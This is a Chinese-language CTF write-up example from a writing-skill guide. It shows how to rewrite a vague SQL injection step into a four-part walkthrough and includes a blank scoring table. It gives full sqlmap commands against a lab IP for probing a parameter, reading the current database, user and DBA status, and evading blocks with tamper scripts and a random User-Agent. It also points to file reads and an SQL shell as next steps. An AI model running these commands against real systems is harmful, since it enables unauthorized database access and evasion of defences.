# 案例 02：只有思路的注入步骤改成四环

来源：`ctf-atlas-writing` 技能「对照示例」的不合格样例与合格示例。

## 粗稿

可以用 sqlmap 检测注入并获取数据。

## 考点清单

1. 先定义目标变量 `TARGET`，后面命令直接引用。
2. 探测：`id=1*` 指定测试位置，`--batch` 取默认值，`--level 2 --risk 2` 覆盖 Cookie 与更复杂 payload。
3. 预期输出出现 `GET parameter 'id' ... injectable`；没有就提高等级重试。
4. 利用：取当前库名、连接账户、是否 DBA。
5. 预期看到 `current database`、`current user`、`current user is DBA`。
6. 排错：403 或拦截时用 `--tamper=space2comment` 或 `--random-agent`；连不上先 `curl -I` 确认可达。

## 参考定稿

**示例：确认参数能否注入，并取当前库名。** 先定义目标，后面所有命令直接引用。

```bash
TARGET="http://192.168.56.101"
```

1. 探测。`id=1*` 的星号让 sqlmap 只在这个位置测试；`--batch` 让交互提问都取默认值；`--level 2 --risk 2` 会测 Cookie 并使用更复杂的 payload。预期输出出现 `GET parameter 'id' ... injectable`；没有出现就改用 `--level 3 --risk 3` 重试。

```bash
sqlmap -u "$TARGET/product.php?id=1*" --batch --level 2 --risk 2
```

2. 利用。确认可注入后取当前库名、连接账户和是否管理员：`--current-db` 输出当前数据库，`--current-user` 输出连接账户，`--is-dba` 判断是否管理员。

```bash
sqlmap -u "$TARGET/product.php?id=1*" --batch --current-db --current-user --is-dba
```

3. 结果。预期看到 `current database: 'shop'`、`current user: 'root@localhost'`、`current user is DBA: True`。是管理员时，下一步可用 `--file-read` 读服务器文件，或用 `--sql-shell` 直接执行 SQL。

4. 排错。返回 403 或拦截页面：加 `--tamper=space2comment` 把空格换成注释符，或加 `--random-agent` 更换 User-Agent 重试。一直连不上：先执行 `curl -I "$TARGET"` 确认目标和端口可达。

## 评分记录

| 日期 | 执行者 | 考点保留率 | 空话数 | 命令完整率 | 备注 |
|---|---|---|---|---|---|
| — | — | — | — | — | 尚未运行 |
